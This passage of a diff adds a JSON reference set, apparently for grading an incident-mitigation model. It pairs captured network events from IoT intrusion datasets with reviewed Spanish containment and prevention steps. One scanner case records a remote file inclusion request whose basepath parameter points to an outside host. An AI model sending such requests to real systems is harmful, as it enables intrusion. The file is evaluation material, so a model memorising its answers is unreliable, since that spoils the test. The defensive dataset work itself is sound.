+          "reference_id": "case-mitlive-11-65a56c45::mitigation::01"
+        },
+        {
+          "base": "revisar logs, eliminar persistencia y rotar credenciales de base de datos expuestas",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Revisar los registros del endpoint por resultados del GET; eliminar persistencia o rotar credenciales solo ante evidencia adicional.",
+          "reference_id": "case-mitlive-11-65a56c45::mitigation::02"
+        },
+        {
+          "base": "usar consultas parametrizadas y evitar la concatenacion de entradas en SQL",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Parametrizar la consulta que procesa id en el endpoint observado y evitar concatenar el valor recibido.",
+          "reference_id": "case-mitlive-11-65a56c45::mitigation::03"
+        },
+        {
+          "base": "validar entradas y actualizar la aplicacion y sus dependencias",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Validar el parámetro id y comprobar actualizaciones de DVWA y sus dependencias en 192.168.0.128.",
+          "reference_id": "case-mitlive-11-65a56c45::mitigation::04"
+        },
+        {
+          "base": "capturar ventana de flujo para evidencia",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Conservar la ventana del flujo TCP de 383 bytes que contiene el GET, la URI codificada y sus extremos.",
+          "reference_id": "case-mitlive-11-65a56c45::mitigation::05"
+        },
+        {
+          "base": "revisar politica de red del segmento",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Revisar si la política permite que 192.168.0.170 acceda por HTTP a ese endpoint de 192.168.0.128:80.",
+          "reference_id": "case-mitlive-11-65a56c45::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "Uploading",
+      "case_id": "case-mitlive-12-cf413724",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "TCP SYN packet from 192.168.0.128:54248 to 192.168.0.170:3333 with TCP options and checksum present.",
+        "dst_ip": "192.168.0.170",
+        "dst_port": 3333,
+        "event_id": "evt_2021231359264870_arp_tcp_syn",
+        "modality": "network_flow",
+        "schema_profile": "network_packet",
+        "semantic_text": "Paquete TCP SYN detectado desde 192.168.0.128 (puerto 54248) hacia 192.168.0.170 (puerto 3333) con flags SYN activado y opciones TCP incluidas. No se observan flags ACK, FIN o RST. Presencia de checksum TCP válido.",
+        "service_context": {
+          "protocol_stack": [
+            "ARP",
+            "TCP"
+          ],
+          "tcp_flags": {
+            "ack": false,
+            "fin": false,
+            "rst": false,
+            "syn": true,
+            "synack": false
+          },
+          "tcp_options": "020405b40402080a4a094fc00000000001030307"
+        },
+        "src_ip": "192.168.0.128",
+        "src_port": 54248,
+        "traffic_direction": "outbound",
+        "transport_proto": "TCP"
+      },
+      "references": [
+        {
+          "base": "deshabilitar temporalmente la subida vulnerable y poner en cuarentena los ficheros recibidos",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Condicionar la deshabilitación y cuarentena a confirmar que el SYN a 192.168.0.170:3333 corresponde a una subida, pues no se observa ningún fichero.",
+          "reference_id": "case-mitlive-12-cf413724::mitigation::00"
+        },
+        {
+          "base": "bloquear el origen y los indicadores asociados con la carga maliciosa",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Bloquear 192.168.0.128 hacia 192.168.0.170:3333 solo si se valida su relación con una carga maliciosa; el registro solo muestra un SYN.",
+          "reference_id": "case-mitlive-12-cf413724::mitigation::01"
+        },
+        {
+          "base": "eliminar los artefactos subidos y buscar ejecucion o persistencia derivada",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Buscar o eliminar artefactos únicamente si el análisis posterior confirma una subida; el evento no aporta datos de ficheros, ejecución ni persistencia.",
+          "reference_id": "case-mitlive-12-cf413724::mitigation::02"
+        },
+        {
+          "base": "aplicar listas permitidas de tipo, tamano y contenido y analizar cada fichero",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Aplicar controles de tipo, tamaño y contenido si el puerto 3333 se confirma como servicio de subida; el SYN no identifica ningún fichero.",
+          "reference_id": "case-mitlive-12-cf413724::mitigation::03"
+        },
+        {
+          "base": "almacenar las cargas fuera de rutas ejecutables y actualizar el componente de subida",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Revisar el almacenamiento y la actualización del componente solo si se vincula la conexión al puerto 3333 con una función de subida.",
+          "reference_id": "case-mitlive-12-cf413724::mitigation::04"
+        },
+        {
+          "base": "capturar muestra de paquetes",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Conservar el SYN TCP de 192.168.0.128:54248 a 192.168.0.170:3333, con sus flags y opciones.",
+          "reference_id": "case-mitlive-12-cf413724::mitigation::05"
+        },
+        {
+          "base": "inspeccionar anomalias de protocolo",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Comprobar si el SYN sin ACK, FIN ni RST y sus opciones TCP son coherentes con el servicio esperado en el puerto 3333.",
+          "reference_id": "case-mitlive-12-cf413724::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "Vulnerability_scanner",
+      "case_id": "case-mitlive-13-ec622ca5",
+      "dataset_origin": "edge_iiotset",
+      "evidence": {
+        "anomaly_summary": "HTTP GET request with suspicious URI query parameter (basepath) pointing to external domain (cirt.net/rfiinc.txt), indicative of potential Remote File Inclusion (RFI) attempt. TCP packet with ACK flag set, payload containing encoded method and service parameters.",
+        "app_proto": "HTTP",
+        "byte_count": 320,
+        "dst_ip": "192.168.0.128",
+        "dst_port": 80,
+        "event_id": "evt_2021193041445395000_192.168.0.170_192.168.0.128",
+        "missing_fields": [
+          "packet_count",
+          "duration_ms"
+        ],
+        "modality": "network_flow",
+        "schema_profile": "network_packet",
+        "semantic_text": "Host 192.168.0.170 (port 49202) sent a TCP packet to 192.168.0.128 (port 80) containing an HTTP GET request with URI query parameter 'basepath=http://cirt.net/rfiinc.txt?' and HTTP payload suggesting an attempt to open a service path. TCP flags indicate established connection (ACK=1). Payload size: 320 bytes.",
+        "service_context": {
+          "http": {
+            "content_length": 57,
+            "file_data": "method=open+service%3a3%2e0%2e2%2e1105&service%5fname=%2f",
+            "full_uri": "http://192.168.0.128/DVWA/include/pear/IT.php?basepath=http://cirt.net/rfiinc.txt?",
+            "method": "GET",
+            "uri_query": "basepath=http://cirt.net/rfiinc.txt?",
+            "version": "HTTP/1.1"
+          },
+          "tcp": {
+            "ack": 18317,
+            "ack_raw": 1449409344,
+            "checksum": 27181,
+            "options": "0101080a3fbbb6b3493ce33d",
+            "seq": 12159
+          }
+        },
+        "src_ip": "192.168.0.170",
+        "src_port": 49202,
+        "traffic_direction": "outbound",
+        "transport_proto": "TCP"
+      },
+      "references": [
+        {
+          "base": "bloquear o limitar el escaner si su actividad no esta autorizada",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Limitar 192.168.0.170 solo si no está autorizado a enviar el GET con basepath externo a 192.168.0.128:80.",
+          "reference_id": "case-mitlive-13-ec622ca5::mitigation::00"
+        },
+        {
+          "base": "aislar el servicio expuesto cuando el escaneo vaya acompanado de intentos de explotacion",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aislar temporalmente el servicio HTTP de 192.168.0.128 solo si la validación del GET confirma riesgo de explotación; un paquete no acredita explotación.",
+          "reference_id": "case-mitlive-13-ec622ca5::mitigation::01"
+        },
+        {
+          "base": "validar los hallazgos y corregir las vulnerabilidades confirmadas",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Validar el parámetro basepath del endpoint y corregir una inclusión remota solo si la prueba confirma esa vulnerabilidad.",
+          "reference_id": "case-mitlive-13-ec622ca5::mitigation::02"
+        },
+        {
+          "base": "mantener inventario y ejecutar escaneos autorizados dentro del ciclo de parcheo",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Incorporar /DVWA/include/pear/IT.php y su parámetro basepath al inventario y a escaneos autorizados del ciclo de parcheo.",
+          "reference_id": "case-mitlive-13-ec622ca5::mitigation::03"
+        },
+        {
+          "base": "retirar componentes obsoletos y reducir la superficie publicada",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Revisar si el endpoint o sus componentes exponen innecesariamente basepath; el evento no aporta versiones para declarar obsolescencia.",
+          "reference_id": "case-mitlive-13-ec622ca5::mitigation::04"
+        },
+        {
+          "base": "capturar muestra de paquetes",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Conservar el paquete TCP de 320 bytes con el GET y basepath=http://cirt.net/rfiinc.txt? para su validación.",
+          "reference_id": "case-mitlive-13-ec622ca5::mitigation::05"
+        },
+        {
+          "base": "inspeccionar anomalias de protocolo",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Comprobar que el GET sobre la conexión TCP establecida y el valor externo de basepath sean coherentes con el servicio HTTP esperado.",
+          "reference_id": "case-mitlive-13-ec622ca5::mitigation::06"
+        }
+      ]
+    },
+    {
+      "attack_type": "XSS",
+      "case_id": "case-mitlive-14-d493c1dd",
+      "dataset_origin": "ton_iot",
+      "evidence": {
+        "anomaly_summary": "TCP connection from internal host to external HTTP server with minimal data transfer and established state.",
+        "app_proto": "http",
+        "byte_count": 52,
+        "dst_ip": "52.28.231.150",
+        "dst_port": 80,
+        "event_id": "evt_20231115_0001",
+        "missing_fields": [
+          "ts"
+        ],
+        "modality": "network_flow",
+        "packet_count": 1,
+        "schema_profile": "network_flow",
+        "semantic_text": "Internal host 192.168.1.32 initiated a TCP connection to external IP 52.28.231.150 on port 80 with protocol TCP. Connection state is SH (established). Single packet sent with 52 bytes. No DNS or SSL anomalies detected in provided fields.",
+        "service_context": {
+          "service": "http"
+        },
+        "src_ip": "192.168.1.32",
+        "src_port": 55032,
+        "traffic_direction": "outbound",
+        "transport_proto": "tcp"
+      },
+      "references": [
+        {
+          "base": "bloquear el payload y el origen XSS mediante WAF o reglas de aplicacion",
+          "item_index": 0,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Aplicar una regla WAF solo si se recupera y confirma un payload XSS en la conexión HTTP a 52.28.231.150:80; el evento no incluye contenido.",
+          "reference_id": "case-mitlive-14-d493c1dd::mitigation::00"
+        },
+        {
+          "base": "deshabilitar temporalmente el formulario o endpoint vulnerable",
+          "item_index": 1,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "containment",
+          "reference_context": "Identificar primero el formulario o endpoint asociado a la conexión HTTP; el evento no aporta URI para deshabilitar uno concreto.",
+          "reference_id": "case-mitlive-14-d493c1dd::mitigation::01"
+        },
+        {
+          "base": "eliminar contenido persistente inyectado y revocar las sesiones potencialmente afectadas",
+          "item_index": 2,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "eradication",
+          "reference_context": "Buscar contenido persistente y revisar sesiones solo si evidencia adicional confirma inyección; el flujo no demuestra persistencia ni afectación.",
+          "reference_id": "case-mitlive-14-d493c1dd::mitigation::02"
+        },
+        {
+          "base": "aplicar codificacion contextual de salida y saneamiento de entradas",
+          "item_index": 3,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Aplicar codificación de salida y saneamiento en el endpoint que se identifique al correlacionar la conexión; el evento no aporta parámetros.",
+          "reference_id": "case-mitlive-14-d493c1dd::mitigation::03"
+        },
+        {
+          "base": "implantar Content Security Policy y actualizar los componentes web",
+          "item_index": 4,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "prevention",
+          "reference_context": "Revisar CSP y versiones en la aplicación que se vincule con 52.28.231.150:80; el evento no identifica componentes web.",
+          "reference_id": "case-mitlive-14-d493c1dd::mitigation::04"
+        },
+        {
+          "base": "capturar ventana de flujo para evidencia",
+          "item_index": 5,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Conservar la ventana del flujo TCP de un paquete y 52 bytes entre 192.168.1.32:55032 y 52.28.231.150:80.",
+          "reference_id": "case-mitlive-14-d493c1dd::mitigation::05"
+        },
+        {
+          "base": "revisar politica de red del segmento",
+          "item_index": 6,
+          "manual_review": {
+            "notes": null,
+            "reviewed_at": "2026-09-07T10:43:05Z",
+            "reviewer": "Manuel Gonzalo Ramírez Tirado",
+            "status": "approved_by_author"
+          },
+          "phase": "profile",
+          "reference_context": "Comprobar si la política del segmento autoriza esa salida HTTP de 192.168.1.32 hacia 52.28.231.150:80.",
+          "reference_id": "case-mitlive-14-d493c1dd::mitigation::06"
+        }
+      ]
+    }
+  ],
+  "provenance": {
+    "authoring_method": "ai_assisted_blind_draft",
+    "authoring_system": "OpenAI Codex",
+    "candidate_context_hidden_during_drafting": true,
+    "component_sources": [
+      {
+        "path": "artifacts/validation_2026/mitigator_mistral_live_multidataset16_20260906_run01/reference_draft_batch_network.json",
+        "sha256": "95c4a044f7f48703b3c697b5f3c108d70b0511b164d0fe4c478c17ad22415f89"
+      },
+      {
+        "path": "artifacts/validation_2026/mitigator_mistral_live_multidataset16_20260906_run01/reference_draft_batch_security.json",
+        "sha256": "7e8927bb303a8894527a30125dacc0dffae38de48cc5787198e49cb5f7a63cf1"
+      },
+      {
+        "path": "artifacts/validation_2026/mitigator_mistral_live_multidataset16_20260906_run01/reference_draft_batch_application.json",
+        "sha256": "e18a33ae1b2ffff3b75bd540a87a049aaa76a936e35390fed7f6781449af1046"
+      }
+    ],
+    "frozen_at": "2026-09-07T10:43:24+00:00",
+    "manual_review_confirmation": {
+      "reviewed_at": "2026-09-07T10:43:05Z",
+      "reviewer": "Manuel Gonzalo Ramírez Tirado",
+      "scope": "all references individually reviewed"
+    },
+    "manual_review_policy": "each reference requires explicit author approval",
+    "manual_review_status": "approved_by_author",
+    "source_material": "canonical event evidence and immutable catalog base only"
+  },
+  "schema_version": "1.0",
+  "summary": {
+    "attack_types": 16,
+    "cases": 16,
+    "manually_approved": 111,
+    "references": 111
+  }
+}
